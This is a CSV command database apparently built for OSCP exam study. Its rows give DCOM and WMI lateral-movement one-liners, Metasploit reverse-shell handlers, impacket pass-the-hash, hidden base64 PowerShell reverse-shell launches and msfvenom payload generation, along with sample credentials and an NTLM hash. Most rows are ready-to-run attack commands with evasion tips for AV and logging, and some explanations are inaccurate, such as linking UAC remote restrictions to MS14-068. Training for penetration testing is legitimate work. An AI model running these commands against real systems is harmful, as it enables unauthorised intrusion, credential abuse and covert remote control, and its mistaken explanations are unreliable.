"dcom-shellwindows","DCOM - ShellWindows COM Object","active-directory","$dcom = [Activator]::CreateInstance([type]::GetTypeFromCLSID(""9BA05972-F6A8-11CF-A442-00A0C90A8F39"",""<TARGET>"")); $item = $dcom.Item(); $item.Document.Application.ShellExecute(""cmd.exe"",""/c <COMMAND>"",""C:\Windows\System32"",$null,0)","Alternative DCOM lateral movement using ShellWindows COM object (CLSID 9BA05972-F6A8-11CF-A442-00A0C90A8F39)","lateral-movement","$dcom = [Activator]::CreateInstance([type]::GetTypeFromCLSID(""9BA05972-F6A8-11CF-A442-00A0C90A8F39"",""192.168.50.73"")); $item = $dcom.Item(); $item.Document.Application.ShellExecute(""cmd.exe"",""/c calc"",""C:\Windows\System32"",$null,0)","EDUCATIONAL CONTEXT:
ShellWindows is alternative DCOM technique for lateral movement - less reliable than MMC20 but useful for evasion.

WHY USE THIS:
Different DCOM vector if MMC20 monitored/blocked by security tools.

RELIABILITY:
Less reliable than MMC20 - depends on active Explorer shell instances (requires logged-in user).

WHEN TO USE:
When you need DCOM diversity for evasion, MMC20 blocked, or testing different vectors.

BEHIND THE SCENES:
Accesses Explorer shell COM object, uses ShellExecute method to run commands.

LIMITATIONS:
Requires user logged in with Explorer running (Session 0 services don't have ShellWindows instances).

COMPARISON:
MMC20 (always available, more reliable) vs ShellWindows (user-dependent, less reliable).

TIME ESTIMATE:
2-3 minutes for testing.

EXAM TIP:
Stick with MMC20 for reliability unless specifically blocked - ShellWindows mainly for research/evasion.","medium","","","","{""Object reference not set"": ""ShellWindows may not have active Explorer instances on target. Try dcom-mmc20-revshell instead"", ""Access denied"": ""Need local admin rights. Verify with: crackmapexec smb <TARGET> -u <USER> -p <PASS>"", ""CreateInstance fails"": ""DCOM/RPC blocked by firewall or DCOM service disabled"", ""Unable to cast COM object"": ""Incompatibility with target Windows version. Use dcom-mmc20-revshell (more compatible)"", ""No active instances"": ""Target has no logged-in users with Explorer running. Use MMC20 technique instead""}","{""GetTypeFromCLSID"": ""Access COM object by CLSID (not ProgID)"", ""9BA05972-F6A8-11CF-A442-00A0C90A8F39"": ""ShellWindows CLSID (Windows Explorer shell)"", ""Item()"": ""Get Explorer shell window instance"", ""ShellExecute"": ""Execute command via Windows shell"", ""0"": ""Window state (0 = hidden)"", ""C:\\Windows\\System32"": ""Working directory for command execution""}","","",""
"dcom-shellbrowserwindow","DCOM - ShellBrowserWindow COM Object","active-directory","$dcom = [Activator]::CreateInstance([type]::GetTypeFromCLSID(""C08AFD90-F2A1-11D1-8455-00A0C91F3880"",""<TARGET>"")); $dcom.Document.Application.ShellExecute(""cmd.exe"",""/c <COMMAND>"",""C:\Windows\System32"",$null,0)","DCOM lateral movement using ShellBrowserWindow COM object (CLSID C08AFD90-F2A1-11D1-8455-00A0C91F3880)","lateral-movement","$dcom = [Activator]::CreateInstance([type]::GetTypeFromCLSID(""C08AFD90-F2A1-11D1-8455-00A0C91F3880"",""192.168.50.73"")); $dcom.Document.Application.ShellExecute(""cmd.exe"",""/c calc"",""C:\Windows\System32"",$null,0)","EDUCATIONAL CONTEXT:
ShellBrowserWindow is third DCOM technique for lateral movement - similar limitations to ShellWindows.

WHY EXISTS:
Provides multiple DCOM vectors for evasion and diversity when one technique monitored.

RELIABILITY:
Low - depends on active browser window instances (requires logged-in user).

WHEN TO USE:
Research, evasion scenarios, or when MMC20/ShellWindows both blocked.

COMPARISON:
MMC20 (always works) > ShellWindows (Explorer dependency)  ShellBrowserWindow (browser dependency).

BEHIND THE SCENES:
Accesses browser shell COM object, calls ShellExecute method.

LIMITATIONS:
Requires user logged in with browser window open - not reliable for automation.

TIME ESTIMATE:
2-3 minutes for testing.

EXAM TIP:
Use MMC20 for OSCP - ShellBrowserWindow mainly for research/evasion.

Focus on reliable techniques (MMC20, WMI, PSExec, WinRM) for exam efficiency.","medium","","","","{""Object not set"": ""ShellBrowserWindow dependency - active browser window required. Use dcom-mmc20-revshell instead"", ""Access denied"": ""Admin rights required. Test: crackmapexec smb <TARGET> -u <USER> -p <PASS>"", ""CreateInstance fails"": ""DCOM disabled or firewall blocking. Check port 135: Test-NetConnection <TARGET> -Port 135"", ""No browser instances"": ""Target has no logged-in users with browser windows. Use MMC20 (always available)""}","{""C08AFD90-F2A1-11D1-8455-00A0C91F3880"": ""ShellBrowserWindow CLSID"", ""Document.Application.ShellExecute"": ""Execute via shell application interface"", ""0"": ""Hidden window state""}","","[""dcom-shellwindows""]",""
"msf-handler-setup","Set Up Multi/Handler for Reverse Shell","exploitation","use exploit/multi/handler; set payload <PAYLOAD>; set LHOST <LHOST>; set LPORT <LPORT>; run","Configure generic handler to receive incoming reverse shells from various payload types","metasploit","use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run","CRITICAL:
Payload type must match EXACTLY (windows/meterpreter/reverse_tcp vs windows/meterpreter_reverse_tcp).

Staged (/) requires multi/handler.

Non-staged (_) works with nc or multi/handler.","high","","","","{""payload_mismatch"": ""Handler payload MUST exactly match generated payload (staged vs non-staged)"", ""port_in_use"": ""Change port or kill existing listener: jobs -K"", ""no_session_created"": ""1) Check network connectivity 2) Verify payload executed on target 3) Check firewall""}","{""multi/handler"": ""Universal handler for all payload types"", ""run"": ""Start handler in foreground (blocks prompt)"", ""run -j"": ""Run as background job (recommended)"", ""run -z"": ""Don't auto-interact with session""}","","","[""msf-session-interact""]"
"msf-handler-background","Start Handler as Background Job","exploitation","use exploit/multi/handler; set payload <PAYLOAD>; set LHOST <LHOST>; set LPORT <LPORT>; run -j","Start listener in background to continue working while waiting for connections","metasploit","use exploit/multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run -j","Background jobs allow multiple handlers on different ports simultaneously.

Essential for multi-target engagements.

Check status with 'jobs' command.","high","","","","{""forgot_job_id"": ""List jobs with: jobs"", ""kill_job"": ""Stop handler: jobs -k <ID>""}","{""-j"": ""Run as job (background task)"", ""-z"": ""Don't auto-interact with session""}","","","[""msf-jobs-list""]"
"msf-handler-autorunscript","Handler with AutoRunScript Post-Exploitation","exploitation","use exploit/multi/handler; set payload <PAYLOAD>; set LHOST <LHOST>; set LPORT <LPORT>; set AutoRunScript <SCRIPT>; run -j","Configure handler to automatically run post-exploitation module when session opens","metasploit","use exploit/multi/handler; set payload windows/meterpreter_reverse_https; set LHOST 192.168.45.5; set LPORT 443; set AutoRunScript post/windows/manage/migrate; run -j","Common AutoRunScripts:
migrate (process stability), hashdump (credential harvesting), autoroute (pivoting setup).

Test scripts manually before automation.","medium","","","","{""script_killed_session"": ""Choose less invasive script or test manually first"", ""script_not_running"": ""Verify script path correct (use info <SCRIPT> to test)""}","{""AutoRunScript"": ""Module to execute when session opens"", ""post/windows/manage/migrate"": ""Auto-migrate to stable process"", ""multi/gather/ping_sweep"": ""Auto-discover network neighbors"", ""post/multi/manage/autoroute"": ""Auto-add routing to internal networks""}","","","[""msf-session-interact""]"
"msf-handler-exitonsession","Handler with ExitOnSession Control","exploitation","use exploit/multi/handler; set payload <PAYLOAD>; set LHOST <LHOST>; set LPORT <LPORT>; set ExitOnSession false; run -j","Configure handler to continue listening after receiving first session (multi-session support)","metasploit","use exploit/multi/handler; set payload windows/meterpreter_reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; set ExitOnSession false; run -j","Essential for catching shells from multiple targets with single handler.

Useful for mass exploitation or persistence payloads.

Set BEFORE running handler.","medium","","","","{""handler_stopped"": ""Verify ExitOnSession set to false BEFORE running handler""}","{""ExitOnSession false"": ""Handler continues listening after first session"", ""ExitOnSession true"": ""Handler stops after first session (default for some payloads)""}","","",""
"msf-session-upgrade-shell","Upgrade Shell to Meterpreter","exploitation","sessions -u <SESSION_ID>","Upgrade existing command shell session to Meterpreter (adds advanced features)","metasploit","sessions -u 1","Upgrade uploads Meterpreter payload to target and executes it.

Creates NEW session (original shell remains).

May trigger AV/EDR.

Windows/Linux support varies.","medium","","","","{""upgrade_failed"": ""Not all shells can be upgraded - depends on platform and session type"", ""session_died"": ""Upgrade may be detected by AV/EDR - try manual Meterpreter payload instead""}","{""-u"": ""Upgrade session to Meterpreter"", ""-k"": ""Kill session instead of upgrading""}","","","[""meterpreter-sysinfo"", ""meterpreter-migrate""]"
"msf-session-script","Run Script on Session","exploitation","sessions -s <SCRIPT> -i <SESSION_ID>","Execute post-exploitation script on specific session without interacting","metasploit","sessions -s post/windows/gather/enum_logged_on_users -i 1","Useful for batch operations on multiple sessions.

Runs in background without interaction.

Results stored in database/loot.","low","","","","{""incompatible_session"": ""Some scripts only work with Meterpreter sessions"", ""script_not_found"": ""Use full module path: post/windows/...""}","{""-s"": ""Run script on session"", ""-i"": ""Specify session ID""}","","",""
"msf-session-command","Run Command on Session","exploitation","sessions -c '<COMMAND>' -i <SESSION_ID>","Execute single command on session without interactive mode","metasploit","sessions -c 'sysinfo' -i 1","Quick way to run single command without full interaction.

Useful for scripting and automation.

Command type must match session type.","low","","","","{""command_type_mismatch"": ""For shell sessions, use shell commands. For Meterpreter, use Meterpreter commands.""}","{""-c"": ""Run command on session"", ""-i"": ""Session ID""}","","[""msf-session-interact""]",""
"msf-session-kill","Kill Active Session","exploitation","sessions -k <SESSION_ID>","Terminate specific session and close connection to target","metasploit","sessions -k 1","Gracefully closes session.

Use -K to kill all sessions (careful in multi-target engagements).

Session cannot be recovered after killing.","medium","","","","","{""-k"": ""Kill session"", ""-K"": ""Kill ALL sessions (dangerous)""}","","",""
"wmi-legacy-wmic","WMI - Legacy wmic Command (Deprecated)","active-directory","wmic /node:<TARGET> /user:<USER> /password:<PASS> process call create ""<COMMAND>""","Execute commands on remote Windows system using deprecated wmic utility (RPC port 135 + high port 19152-65535)","lateral-movement","wmic /node:192.168.50.73 /user:corp\jen /password:Nexus123! process call create ""calc""","OSCP TRAINING MATERIAL - WMI LATERAL MOVEMENT:
WHAT IS WMI:
Windows Management Instrumentation is an object-oriented feature for task automation.

Historically abused for lateral movement via remote process creation using Win32_Process class.

DEPRECATION STATUS:
wmic.exe deprecated in Windows 10 21H1+ but STILL PRESENT in OSCP exam environments (Windows Server 2019/2022).

Must know for exam.

SESSION 0 BEHAVIOR (CRITICAL):
System processes and services always run in Session 0 as part of session isolation (introduced Windows Vista).

Because WMI Provider Host runs as a SYSTEM service, newly created processes through WMI spawn in Session 0.

This means:
- GUI applications like calc.exe won't be visible to logged-in users
- Verify execution via Task Manager or tasklist, NOT by looking for windows
- Process runs with SYSTEM or user privileges depending on method

PORT REQUIREMENTS:
- TCP 135:
RPC endpoint mapper (required for initial connection)
- TCP 49152-65535:
Dynamic/ephemeral port range for session data (Windows Server 2008+)
- Older systems use 1024-5000 range
- Firewall must allow BOTH port 135 AND high-range ports

UAC REMOTE RESTRICTIONS:
Domain users bypass UAC remote restrictions (different than local accounts).

This is why jen (domain user + local admin) can execute without UAC prompts.

MANUAL ALTERNATIVE:
PowerShell Get-WmiObject -Class Win32_Process | Invoke-WmiMethod -Name Create -ArgumentList ""calc"" uses same WMI API.

TIME ESTIMATE:
2-3 minutes for command execution + verification.

EXAM STRATEGY:
Use wmic for quick proof-of-concept, then upgrade to reverse shell via wmi-powershell-revshell.","high","","","","{""RPC server is unavailable"": ""Verify port 135 open: nmap -p 135 -Pn -sV <TARGET>"", ""Access is denied"": ""User needs local admin rights. Verify with: crackmapexec smb <TARGET> -u <USER> -p <PASS>"", ""Invalid credentials"": ""Test credentials first: crackmapexec smb <TARGET> -u <USER> -p <PASS>""}","{""/node:<TARGET>"": ""Specifies remote computer name or IP address"", ""/user:<USER>"": ""Domain\\username or username for authentication"", ""/password:<PASS>"": ""Password for authentication (cleartext)"", ""process call create"": ""WMI method to spawn new process remotely""}","","[""wmi-invoke-method"", ""wmi-new-cimsession"", ""wmi-impacket-exec""]",""
"wmi-invoke-method","WMI - PowerShell Invoke-WmiMethod","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '<COMMAND>' -ComputerName <TARGET> -Credential $credential","Execute commands remotely using PowerShell Invoke-WmiMethod with Win32_Process class","lateral-movement","$password = ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('corp\jen', $password); Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'calc' -ComputerName 192.168.50.73 -Credential $credential","OSCP METHODOLOGY - POWERSHELL WMI EXECUTION:
WHY POWERSHELL OVER WMIC:
Modern alternative that provides better error handling, credential object support, and programmatic control.

Wmic is deprecated but PowerShell WMI cmdlets remain supported.

CREDENTIAL OBJECT REQUIREMENT:
Must create PSCredential object first:
1.

ConvertTo-SecureString converts plaintext password to secure string
2.

New-Object System.Management.Automation.PSCredential combines username + secure password
3.

This object is reusable across multiple WMI calls

PROTOCOL:
Uses DCOM (Distributed COM) over RPC:
- Port 135 for endpoint mapper
- Dynamic port 49152-65535 for data channel
- Same underlying protocol as wmic utility

SESSION 0 EXECUTION:
Processes spawn in Session 0 (system services context).

Verify with tasklist, not GUI.

UAC REMOTE RESTRICTIONS BYPASS:
Domain users automatically bypass UAC remote restrictions per MS14-068.

Local accounts (except RID-500 Administrator) are restricted.

MANUAL DISCOVERY METHOD:
1.

Get-WmiObject -Class Win32_Process -List (shows available methods)
2.

Identify Create method signature
3.

Invoke-WmiMethod calls the Create method with ArgumentList

TIME ESTIMATE:
3-5 minutes (PSCredential creation + execution + verification).

EXAM TIP:
Save PSCredential one-liner in notes for quick reuse during exam.","high","","","","{""Access is denied"": ""Verify admin access: Get-WmiObject -Class Win32_ComputerSystem -ComputerName <TARGET> -Credential $credential"", ""RPC server unavailable"": ""Check firewall allows RPC: Test-NetConnection <TARGET> -Port 135"", ""Null-valued expression"": ""Ensure PSCredential object created successfully: $credential | Get-Member""}","{""-Class Win32_Process"": ""WMI class that manages processes"", ""-Name Create"": ""WMI method to spawn new process"", ""-ArgumentList"": ""Command string passed to Create method"", ""-ComputerName"": ""Remote target hostname or IP"", ""-Credential"": ""PSCredential object containing username/password""}","","[""wmi-new-cimsession"", ""wmi-impacket-exec"", ""wmi-legacy-wmic""]",""
"wmi-new-cimsession","WMI - PowerShell New-CimSession","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); $options = New-CimSessionOption -Protocol DCOM; $session = New-CimSession -ComputerName <TARGET> -Credential $credential -SessionOption $options; Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='<COMMAND>'}","Create CIM session over DCOM protocol and execute commands via Invoke-CimMethod","lateral-movement","$password = ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('corp\jen', $password); $options = New-CimSessionOption -Protocol DCOM; $session = New-CimSession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options; Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='powershell -nop -w hidden -e cG93ZXJzaGVsbCAtZSBKQUJqQUd3QWFRQmxBRzRBZEFBZ0FEMEFJQUJPQUdVQWR3QXRBRThBWWdCcUFHVUFZd0IwQUNBQVV3QjVBSE1BZEFCbEFHMEFMZ0JPQUdVQWRBQXVBRk1BYndCagpBR3NBWlFCMEFITUFMZ0JVQUVNQVVBQWJBR3dBYVFCbEFHNEFkQUFvQUNJQU1RQTVBR0lBTGdBeEFEWUFPQUF1QURFQU1RQTRB'}","OSCP TRAINING - CIM SESSION METHOD (RECOMMENDED POWERSHELL APPROACH):
WHAT IS CIM:
Common Information Model - Microsoft's modern replacement for WMI cmdlets.

Introduced PowerShell 3.0+.

WHY USE CIM OVER WMI CMDLETS:
- Better error handling and structured output
- Session reusability (create once, use many times)
- Supports both DCOM and WS-MAN (WinRM) protocols
- Future-proof (WMI cmdlets may be deprecated)

DCOM PROTOCOL SELECTION:
New-CimSessionOption -Protocol DCOM forces legacy DCOM protocol instead of WinRM:
- No WinRM service requirement (port 5985/5986)
- Uses RPC port 135 + ephemeral ports 49152-65535
- Compatible with older Windows systems
- Bypasses WinRM configuration requirements (TrustedHosts, etc.)

SESSION PERSISTENCE ADVANTAGE:
1.

Create session once with New-CimSession (stores credentials)
2.

Reuse $session variable for multiple Invoke-CimMethod calls
3.

No re-authentication overhead
4.

Faster than Invoke-WmiMethod for multiple commands

COMMAND EXECUTION FLOW (FROM TRAINING MATERIAL):
1.

Create PSCredential object (username + password)
2.

Set session options to DCOM protocol
3.

Establish CimSession to target (authentication happens here)
4.

Invoke-CimMethod executes Win32_Process.Create remotely
5.

Process spawns in Session 0 on target

STEALTH BENEFITS:
- No WinRM event logs (uses DCOM not WS-MAN)
- No service creation (unlike PSExec)
- Native Windows feature (not suspicious)

TIME ESTIMATE:
2-4 minutes (session setup + command execution).

EXAM STRATEGY:
Use this method when you need to run multiple commands on same target - session reuse saves time.","high","","","","{""Access denied"": ""Test session creation: Test-WSMan -ComputerName <TARGET> -Credential $credential"", ""WinRM error"": ""This uses DCOM not WinRM - ensure port 135 open not 5985"", ""Session creation fails"": ""Verify credentials: Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName <TARGET> -Credential $credential""}","{""New-CimSessionOption -Protocol DCOM"": ""Specifies DCOM as transport (legacy WMI protocol)"", ""New-CimSession"": ""Creates persistent session to remote WMI service"", ""-SessionOption"": ""Applies DCOM protocol configuration"", ""Invoke-CimMethod"": ""Executes WMI method on established session"", ""-ClassName Win32_Process"": ""Target WMI class for process creation"", ""-MethodName Create"": ""WMI method to spawn process"", ""-Arguments @{CommandLine=''}"": ""Hash table with command parameters""}","","[""wmi-invoke-method"", ""wmi-impacket-exec""]",""
"wmi-impacket-exec","WMI - Impacket wmiexec (Kali)","active-directory","impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>","Semi-interactive shell via WMI from Kali using impacket-wmiexec (executes commands through WMI without touching disk)","lateral-movement","impacket-wmiexec corp.com/jen:Nexus123!@192.168.50.73","OSCP TRAINING - IMPACKET WMIEXEC (PRIMARY KALI  WINDOWS LATERAL MOVEMENT):
TRAINING MATERIAL EXAMPLE:
From OSCP module, jen's account used to move from Kali to FILES04 using NTLM hash:
'impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73'

WHAT IS IMPACKET-WMIEXEC:
Python-based semi-interactive shell that executes commands remotely via WMI without writing binaries to disk.

Part of Impacket suite (installed by default on Kali).

HOW IT WORKS (TECHNICAL BREAKDOWN):
1.

Authenticates to target via SMB (port 445) using provided credentials
2.

Creates temporary administrative share (ADMIN$ or custom)
3.

Executes commands via WMI Win32_Process.Create method (port 135 + ephemeral)
4.

Retrieves command output via SMB share
5.

Deletes output file from share
6.

Repeats for each command (semi-interactive loop)

FILELESS EXECUTION:
- No .exe binary dropped to disk
- No service created (unlike PSExec)
- All execution through native WMI Provider Host
- Output temporarily written to share then deleted

PROTOCOL REQUIREMENTS:
- SMB (port 445):
Authentication + output retrieval
- RPC (port 135):
WMI communication
- Ephemeral ports (49152-65535):
Session data

PASS-THE-HASH SUPPORT (CRITICAL FOR OSCP):
Use -hashes flag with format :NTLM (LM hash optional, usually blank):
'impacket-wmiexec -hashes :NTLM_HASH user@target'
No password cracking needed - authenticate with hash directly.

STEALTH ADVANTAGES OVER PSEXEC:
- No Event ID 7045 (service creation)
- No psexesvc.exe binary on disk
- Less antivirus detection
- Native WMI process creation (appears legitimate)

SEMI-INTERACTIVE SHELL BEHAVIOR:
- Each command executes independently (not truly interactive)
- Current directory NOT preserved between commands
- Use full paths or 'cd /d C:\Path && command' syntax
- No tab completion

TIME ESTIMATE:
1-2 minutes for connection, <1 second per command execution.

EXAM STRATEGY:
Preferred tool for lateral movement from Kali when you have credentials or NTLM hashes.

More reliable than evil-winrm in some environments.","high","","","","{""STATUS_LOGON_FAILURE"": ""Invalid credentials. Test with: crackmapexec smb <TARGET> -u <USER> -p <PASS>"", ""Connection timeout"": ""Firewall blocking SMB/RPC. Check ports: sudo nmap -p 135,445 -Pn -v <TARGET>"", ""STATUS_ACCESS_DENIED"": ""User not local admin. Verify with: crackmapexec smb <TARGET> -u <USER> -p <PASS> --local-auth""}","{""-hashes :NTLM"": ""Pass-the-hash with NTLM hash (no password needed)"", ""-shell-type powershell"": ""Use PowerShell instead of cmd.exe"", ""-codec utf-8"": ""Set character encoding for special characters"", ""-nooutput"": ""Don't retrieve command output (faster execution)""}","","[""psexec-impacket-shell"", ""smbexec-impacket-fileless"", ""evil-winrm-shell""]",""
"wmi-cme-exec","WMI - CrackMapExec Command Execution","active-directory","crackmapexec smb <TARGET> -u <USER> -p <PASS> -x '<COMMAND>'","Execute single command on remote Windows via WMI using CrackMapExec","lateral-movement","crackmapexec smb 192.168.50.73 -u jen -p Nexus123! -x 'whoami'","EDUCATIONAL CONTEXT:
CrackMapExec wraps Impacket for rapid command execution.

WHY USE CME:
Supports subnet spraying (192.168.50.0/24), multiple hosts in single command.

BEHIND THE SCENES:
Uses wmiexec execution method by default.

COMPARISON:
-x for cmd.exe, -X for PowerShell, choose based on command type.

TIME ESTIMATE:
<1 minute for single command.

EXAM TIP:
Quick way to test command execution across multiple hosts.","high","","","","{""Authentication failed"": ""Try with domain: crackmapexec smb <TARGET> -d <DOMAIN> -u <USER> -p <PASS>"", ""Connection error"": ""Verify SMB open: crackmapexec smb <TARGET>"", ""No output shown"": ""Command may still execute - verify on target system""}","{""-x '<COMMAND>'"": ""Execute cmd.exe command via WMI"", ""-X '<COMMAND>'"": ""Execute PowerShell command via WMI"", ""-H <NTLM>"": ""Use NTLM hash for pass-the-hash"", ""--exec-method wmiexec"": ""Explicitly specify WMI execution (default)"", ""-d <DOMAIN>"": ""Specify domain for authentication""}","","[""wmi-impacket-exec""]",""
"wmi-powershell-revshell","WMI - PowerShell Reverse Shell","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); $options = New-CimSessionOption -Protocol DCOM; $session = New-CimSession -ComputerName <TARGET> -Credential $credential -SessionOption $options; $command = 'powershell -nop -w hidden -e <BASE64_PAYLOAD>'; Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$command}","Deploy base64-encoded PowerShell reverse shell via WMI for callback to attacker","lateral-movement","$password = ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('corp\jen', $password); $options = New-CimSessionOption -Protocol DCOM; $session = New-CimSession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options; $command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC...'; Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$command}","EDUCATIONAL CONTEXT:
Combines WMI lateral movement with PowerShell reverse shell for full interactive access.

WHY BASE64:
Avoids escaping issues with special characters in PowerShell one-liner.

HOW TO GENERATE:
Use base64-encode-powershell command or Python script from module.

STEALTH CONSIDERATIONS:
Runs in Session 0 (system context), encoded to avoid AV signature detection.

MANUAL DECODE:
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>')).

TIME ESTIMATE:
3-5 minutes including payload generation.

EXAM TIP:
Pre-generate payloads before exam for various LHOST/LPORT combinations.","high","","","","{""No connection received"": ""Verify LHOST/LPORT in encoded payload match listener"", ""Payload fails to execute"": ""Test decoding: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))"", ""Access denied"": ""Ensure user has admin rights: crackmapexec smb <TARGET> -u <USER> -p <PASS>"", ""Firewall blocking callback"": ""Test outbound connectivity from target first""}","{""-nop"": ""No profile - don't load PowerShell profiles (faster/stealthy)"", ""-w hidden"": ""Hidden window - no visible PowerShell window"", ""-e <BASE64>"": ""Encoded command - executes base64 payload"", ""CommandLine=$command"": ""Full command string passed to WMI process creation""}","","",""
"wmi-verify-enabled","WMI - Verify Service Enabled","active-directory","Get-WmiObject -Class Win32_OperatingSystem -ComputerName <TARGET> -Credential (Get-Credential)","Verify WMI service is running and accessible on remote target","lateral-movement","Get-WmiObject -Class Win32_OperatingSystem -ComputerName 192.168.50.73 -Credential (Get-Credential)","EDUCATIONAL CONTEXT:
Quick test to verify WMI accessibility before attempting lateral movement.

WHY WIN32_OPERATINGSYSTEM:
Lightweight query that exists on all Windows versions.

ALTERNATIVE TEST:
wmic /node:<TARGET> /user:<USER> os get caption (from cmd.exe).

FIREWALL REQUIREMENTS:
Needs RPC port 135 and high-range dynamic ports.

TIME ESTIMATE:
<1 minute for verification.","medium","","","","{""RPC server unavailable"": ""Check port 135: Test-NetConnection <TARGET> -Port 135"", ""Access denied"": ""Test credentials: crackmapexec smb <TARGET> -u <USER> -p <PASS>"", ""Timeout"": ""Firewall likely blocking WMI/RPC ports""}","{""-Class Win32_OperatingSystem"": ""WMI class that exists on all Windows systems"", ""-ComputerName"": ""Target system to query"", ""-Credential"": ""Prompts for credentials interactively""}","","",""
"wmi-invoke-wmimethod","WMI Invoke-WmiMethod Remote Command","active-directory","Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '<COMMAND>' -ComputerName <TARGET> -Credential $cred","Execute command on remote system via WMI Win32_Process.Create method from PowerShell","lateral-movement","Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c whoami > C:\temp\out.txt' -ComputerName 192.168.50.73 -Credential $cred","ReturnValue 0 = success. Output not returned - redirect to file and retrieve separately. Create cred: $cred = Get-Credential","high","","","","","{""-Class Win32_Process"": ""WMI class for process management"", ""-Name Create"": ""Method to create new process"", ""-ArgumentList"": ""Command line to execute"", ""-ComputerName"": ""Target system"", ""-Credential"": ""PSCredential object ($cred = Get-Credential)""}","","",""
"wmic-process-create","WMIC Remote Process Creation","active-directory","wmic /node:<TARGET> /user:<USER> /password:<PASS> process call create '<COMMAND>'","Execute command on remote system via WMIC process creation from cmd.exe","lateral-movement","wmic /node:192.168.50.73 /user:Administrator /password:Password123! process call create 'cmd.exe /c whoami > C:\temp\out.txt'","Output not returned - must redirect to file. WMIC deprecated in newer Windows but still works. Alternative: Invoke-WmiMethod in PowerShell.","high","","","","","{""/node"": ""Target computer"", ""/user"": ""Username for authentication"", ""/password"": ""Password for authentication"", ""process call create"": ""WMI method to create process""}","","",""
"mysql-connect-interactive","MySQL Interactive Connection","exploitation","mysql -h <TARGET> -u <USER> -p","Connect to MySQL database with interactive password prompt for secure authentication","database-exploitation","mysql -h 192.168.45.100 -u root -p","Interactive password prompt prevents password exposure in shell history and process list.

More secure than inline password (-p'password').

Default port 3306.","high","","","","","{""-h"": ""MySQL server hostname or IP address"", ""-u"": ""Username for authentication"", ""-p"": ""Prompt for password interactively (secure - no password in shell history)""}","","[""mysql-connect-basic""]",""
"smbmap-enumerate-auth","SMBMap Enumerate with Credentials","exploitation","smbmap -u <USER> -p <PASS> -H <TARGET>","Enumerate SMB shares and permissions using valid credentials","network-exploitation","smbmap -u administrator -p Password123 -H 192.168.45.100","Null session attempt:
-u '' -p ''.

Check for WRITE permissions for exploitation.

Common shares:
C$, ADMIN$, IPC$, SYSVOL, NETLOGON.","high","","","","","{""-u"": ""Username for authentication"", ""-p"": ""Password for authentication"", ""-H"": ""Target host IP or hostname"", ""-R"": ""Recursively list directories (optional)"", ""-d"": ""Domain name (optional)""}","","[""smbmap-shares"", ""smbclient-connect""]",""
"grep-metasploit-exploits","Search Metasploit Exploits Directory","exploitation","grep -r '<QUERY>' /usr/share/metasploit-framework/modules/exploits/","Search Metasploit exploit modules for specific service or vulnerability","metasploit","grep -r 'ProFTPD' /usr/share/metasploit-framework/modules/exploits/","Metasploit modules location:
/usr/share/metasploit-framework/modules/exploits/<platform>/<service>/.

Search by CVE:
grep -r 'CVE-2021-1234'.

OSCP:
Limited Metasploit usage (one module only).","medium","","","","","{""-r"": ""Recursive search through all subdirectories"", ""-i"": ""Case-insensitive search (add if needed)"", ""-l"": ""List filenames only (add if needed)""}","","[""searchsploit-service-version""]",""
"nmap-msf-import","Nmap to Metasploit Database Import","exploitation","nmap <OPTIONS> <TARGET> -oX scan.xml && msf-db-import scan.xml","Scan target with Nmap and import results into Metasploit database for module targeting","metasploit","nmap -sV -sC -p- 192.168.45.100 -oX scan.xml && msf-db-import scan.xml","OSCP:
Rarely needed, Metasploit usage limited to one module.

More useful for lab practice.

Import command in msfconsole:
db_import scan.xml","low","","","","","{""-oX"": ""Output XML format for Metasploit import"", ""&&"": ""Chain commands - run import after successful scan""}","","",""
"msfvenom-linux-x86-shell","MSFVenom Linux x86 Reverse Shell","exploitation","msfvenom -p linux/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o <OUTPUT>","Generate 32-bit Linux reverse shell executable","metasploit","msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell-x86.elf","Use for 32-bit Linux systems.

Check architecture:
uname -m (i686=32-bit, x86_64=64-bit).

Non-staged payload (no Metasploit handler required).","high","","","","","{""-p"": ""Payload type to generate"", ""LHOST="": ""Attacker IP (listener host)"", ""LPORT="": ""Attacker port (listener port)"", ""-f"": ""Output format (elf for Linux executable)"", ""-o"": ""Output file""}","[""nc-listener""]","[""msfvenom-linux-elf""]",""
